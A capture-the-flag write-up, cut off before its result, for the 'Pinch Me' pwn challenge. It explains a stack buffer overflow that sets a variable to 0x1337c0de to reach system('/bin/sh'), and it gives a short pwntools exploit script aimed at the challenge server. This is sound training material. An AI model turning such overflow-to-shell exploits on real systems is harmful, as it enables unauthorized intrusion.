## Pinch Me (100 Points)

### Problem
```
This should be easy!

nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480

File: pinch_me
```

### Solution
I opened the binary in Ghidra and looked at `main()` and `vuln()`.

It looks pretty similar to the [Pwn Sanity Check](PwnSanityCheck.md) challenge, we need to overflow our input and ensure the shell gets executed.

Looking at `vuln()` we see that `fgets` reads in `100` bytes into `local_28` which only has `24` bytes allocated - so the remaining bytes will overflow into `local_10`.
We see from the C code that there's a condition to be met before the shell executes.

```C
if (local_10 == 0x1337c0de) {
  system("/bin/sh");
}
```

Can we just send 24 bytes of data and use `p64` to pack the address `0x1337c0de` so then our condition will be met? Let's write some Python and find out.


```python
from pwn import *

host = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
host.recv()

buffer_overflow = b'a'*24
buffer_overflow += p64(0x1337c0de)

host.sendline(buffer_overflow)
host.interactive()
```

Running our exploit...
